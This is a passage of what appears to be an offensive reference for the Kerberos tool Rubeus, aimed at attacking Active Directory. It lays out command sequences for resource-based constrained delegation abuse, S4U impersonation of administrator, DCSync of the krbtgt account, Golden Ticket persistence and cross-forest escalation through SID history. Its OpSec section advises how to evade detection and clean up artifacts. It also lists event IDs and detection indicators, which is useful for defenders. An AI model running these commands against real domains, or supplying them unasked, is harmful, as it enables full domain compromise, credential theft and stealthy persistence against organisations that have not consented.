Rubeus.exe s4u /user:websvc$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /altservice:ldap /ptt

# 4. DCSync
mimikatz # lsadump::dcsync /user:krbtgt
```

### Scenario 4: RBCD Attack from GenericWrite

```powershell
# 1. Create controlled computer account
python3 addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd' corp.local/user:pass

# 2. Configure RBCD on target
$SID = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 3. S4U attack
Rubeus.exe hash /password:P@ssw0rd /user:YOURPC$ /domain:corp.local
Rubeus.exe s4u /user:YOURPC$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# 4. Access target
dir \\target.corp.local\c$
```

### Scenario 5: Golden Ticket Persistence

```powershell
# 1. DCSync krbtgt
python3 secretsdump.py corp.local/admin:Pass@dc01 -just-dc-user krbtgt

# 2. Create Golden Ticket
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:sneakyadmin /id:500 /groups:512,518,519 /domain:corp.local /sid:S-1-5-21-... /ptt

# 3. Maintain access indefinitely
# Golden tickets are valid until krbtgt password is rotated TWICE
```

### Scenario 6: Cross-Forest Attack via SID History

```powershell
# 1. Compromise child domain and get krbtgt
# 2. Create Golden Ticket with Enterprise Admins SID
Rubeus.exe golden /aes256:CHILD_KRBTGT_AES /user:childadmin /domain:child.corp.local /sid:S-1-5-21-CHILD /sids:S-1-5-21-PARENT-519 /ptt

# 3. Access parent domain
dir \\dc01.corp.local\c$
```

---

## Command Reference

### Complete Command List

| Command | Description | Admin Required |
|---------|-------------|----------------|
| `asktgt` | Request TGT from KDC | No |
| `asktgs` | Request TGS from KDC | No |
| `asreproast` | AS-REP Roasting attack | No |
| `changepw` | Change user password | No |
| `createnetonly` | Create process with new LUID | Yes |
| `currentluid` | Display current LUID | No |
| `describe` | Parse and describe ticket | No |
| `diamond` | Create Diamond Ticket | No |
| `dump` | Dump tickets from memory | Yes |
| `golden` | Create Golden Ticket | No |
| `harvest` | Harvest TGTs periodically | Yes |
| `hash` | Calculate Kerberos keys | No |
| `kerberoast` | Kerberoasting attack | No |
| `klist` | Detailed ticket listing | No |
| `monitor` | Monitor for new TGTs | Yes |
| `ptt` | Pass-the-Ticket (inject) | No |
| `purge` | Purge tickets | No |
| `renew` | Renew ticket | No |
| `s4u` | S4U delegation abuse | No |
| `silver` | Create Silver Ticket | No |
| `tgtdeleg` | Get usable TGT via delegation | No |
| `triage` | Quick ticket overview | No |

### Common Flags

| Flag | Description |
|------|-------------|
| `/user:` | Target username |
| `/domain:` | Target domain |
| `/dc:` | Domain controller to use |
| `/password:` | Plaintext password |
| `/rc4:` | NTLM/RC4 hash |
| `/aes256:` | AES256 key |
| `/aes128:` | AES128 key |
| `/ticket:` | Base64 or .kirbi ticket |
| `/ptt` | Pass-the-Ticket (inject immediately) |
| `/outfile:` | Save output to file |
| `/outdir:` | Save multiple outputs to directory |
| `/nowrap` | No base64 line wrapping |
| `/opsec` | Enable OpSec mode |
| `/enctype:` | Specify encryption type |
| `/luid:` | Logon session LUID |

---

## OpSec Considerations

### Encryption Type Selection

| Type | Detection Risk | Notes |
|------|----------------|-------|
| RC4 (etype 23) | High | Easily detected, often flagged |
| AES128 (etype 17) | Medium | Less common in attacks |
| AES256 (etype 18) | Low | Matches normal traffic |

```powershell
# Always prefer AES when possible
Rubeus.exe asktgt /user:admin /aes256:KEY /opsec /ptt
Rubeus.exe kerberoast /aes
```

### Event IDs Generated

| Action | Event ID | Description |
|--------|----------|-------------|
| TGT Request | 4768 | Kerberos Authentication Service |
| TGS Request | 4769 | Kerberos Service Ticket Operations |
| Kerberoast | 4769 | TGS for SPN (RC4 encryption = suspicious) |
| Ticket Injection | 4648 | Explicit Credential Logon |
| Golden Ticket Use | 4769 | TGS without prior 4768 event |
| Ticket Dump | 4656 | LSASS handle access |

### Detection Indicators

**Golden Ticket:**
- TGS request (4769) without corresponding AS request (4768)
- Unusual ticket lifetime (default forged is 10 years)
- Non-existent username with valid ticket
- Group membership inconsistencies

**Kerberoasting:**
- Multiple TGS requests (4769) for SPNs in short period
- RC4 encryption requests from modern clients
- Requests from unusual source IPs

### Reducing Detection

```powershell
# Use AES encryption
Rubeus.exe asktgt /user:admin /aes256:KEY /opsec

# Match legitimate ticket lifetimes
Rubeus.exe golden /aes256:KEY /user:admin /startoffset:0 /endin:600 /renewmax:10080 ...

# Targeted vs broad attacks
Rubeus.exe kerberoast /user:svc_sql  # Targeted (quieter)
# vs
Rubeus.exe kerberoast  # All accounts (noisy)

# Add delays
Rubeus.exe kerberoast /delay:2000 /jitter:30

# Specify DC directly
Rubeus.exe asktgt /user:admin /aes256:KEY /dc:dc01.corp.local
```

### Credential Material Security

```powershell
# Inject directly, avoid files
Rubeus.exe asktgt /user:admin /password:Pass123! /ptt

# Purge when done
Rubeus.exe purge

# If files needed, cleanup
Remove-Item C:\tickets\*.kirbi -Force
```

### LSASS Access Considerations

Dumping and monitoring require LSASS access, generating:
- EDR alerts
- Event ID 4656 (handle access)
- Sysmon Event ID 10 (process access)

**Mitigations:**
- Use BOF versions of Rubeus functions
- Run from SYSTEM context
- Time operations during high activity

---

## References

- [GhostPack Rubeus - Official Repository](https://github.com/GhostPack/Rubeus)
- [Rubeus Wiki](https://github.com/GhostPack/Rubeus/wiki)
- [HarmJ0y Blog - Rubeus](https://blog.harmj0y.net/category/rubeus/)
- [SpecterOps - Kerberos Research](https://posts.specterops.io/)
- [AD Security - Kerberos Attacks](https://adsecurity.org/)
- [Microsoft - Kerberos Authentication](https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- [Kerberos Event IDs](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-authentication-service)
